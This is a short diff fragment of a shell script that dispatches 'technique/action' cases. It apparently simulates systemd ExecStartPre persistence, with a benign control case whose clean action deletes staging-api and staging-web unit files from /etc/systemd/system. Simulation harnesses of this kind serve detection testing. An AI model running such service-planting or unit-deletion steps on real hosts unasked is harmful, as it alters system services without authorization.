+    "$(pick /home/deploy/app/bin/pre-start.sh /home/deploy/releases/current/setup.sh)" > "$f" ;;
+benign-staging-execpre:clean) rm -f /etc/systemd/system/staging-api.service /etc/systemd/system/staging-web.service ;;
 
 *) echo "unknown technique/action: $ID:$ACT" >&2; exit 2 ;;
 esac
